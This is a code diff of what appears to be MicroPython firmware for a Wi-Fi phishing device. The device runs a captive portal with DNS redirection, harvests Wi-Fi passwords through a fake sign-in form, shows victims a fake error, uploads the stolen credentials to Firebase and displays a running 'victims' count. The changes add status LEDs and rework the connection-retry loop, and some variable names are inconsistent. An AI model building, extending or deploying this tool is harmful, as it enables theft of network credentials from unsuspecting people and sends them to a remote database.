@@ -60,7 +60,7 @@ def setup_mode():
     - Serves HTML templates from "./ap_templates/" ;
     - Captures DNS requests to force browser redirection ;
     - Collects Wi-Fi credentials through a web form."""
-
+    LED_R.on()
     print("Entering setup mode...")
     activity_light()
     
@@ -103,7 +103,8 @@ def setup_mode():
         # Reboot device after sending response
         _thread.start_new_thread(machine_reset, ())
         activity_light()
-
+        
+        LED_R.off()
         return "We couldn’t sign you in. Please check your credentials and try again.", 200
     
 
@@ -139,6 +140,7 @@ try:
     reset_wifi()
     activity_light()
     print("Starting in application mode...")
+    LED_B.on()
     os.stat(WIFI_FILE)
     activity_light()
     print("File exists, loading wifi credentials...")
@@ -154,20 +156,26 @@ try:
         print(wifi_credentials)
         
         # Tries to connect to a predefined WiFi connection "user_WIFI"
-        while wifi_current_attempt < WIFI_MAX_ATTEMPTS:
+        while wifi_current_attempt <= WIFI_MAX_ATTEMPTS:
             print(f"Attempt {wifi_current_attempt} to connect to wifi...")
+            activity_light()
             user = wifi_credentials["user"]
             PASSWORD = wifi_credentials["password"]
+
             print(f"Connecting to {user_WIFI} with password {PASSWORD_WIFI}")
-            # Connect to wifi
             ip_address = connect_to_wifi(user_WIFI, PASSWORD_WIFI)
-            print(f"Connected to wifi, IP address {ip_address}")
-            if is_connected_to_wifi():
-                print(f"Connected to wifi, IP address {ip_address}")
-                break
-            else:
-                wifi_current_attempt += 1
+            activity_light()
+
+            if ip_address is not None and is_connected_to_wifi():
+                print(f"✅ Connected to wifi, IP address {ip_address}")
                 activity_light()
+                break  # Exit the loop on success
+
+            print("❌ Failed to connect on this attempt.")
+            wifi_current_attempt += 1
+            activity_light()
+            utime.sleep(1)  # Optional delay between attempts
+
 
         # If successfully connected to "user_WIFI", then sends the captured credentials to Firebase
         if is_connected_to_wifi():
@@ -177,11 +185,13 @@ try:
             upload_wifi_data(user, PASSWORD)
             activity_light()
             print("Credentials uploaded to Firebase")
-            _thread.start_new_thread(start_display, ()) # Display the current amount of victims counted in the database
+            
+            display_victims_count_once()
         else:
             print("Bad wifi connection!")
     
     # Cleaning the leftovers
+    LED_B.off()
     reset_wifi()
     activity_light()
     utime.sleep(1)
@@ -193,7 +203,9 @@ try:
 
 # If any error occurs, cleans the Wifi state and lanches the captive portal for setup.
 except Exception:
+    LED_B.off()
     print("⚠️ Could not connect to Wi-Fi. Switching to setup mode...")
+    LED_R.on()
     activity_light()
     # ❗ Désactive AP mode s'il est actif
     reset_wifi()
@@ -203,7 +215,7 @@ except Exception:
     # ✅ Lance le serveur
     print("Starting server...")
     activity_light()
-    # _thread.start_new_thread(safety.shutdown_watchdog, ()) ℹ️ This line cannot be implemented on current hardware due to lack of cores.
+    # _thread.start_new_thread(safety.shutdown_watchdog, ())  This line cannot be implemented due to hardware limitations: Insufficient amount of cores.
     activity_light()
     while(True):
         server.run()
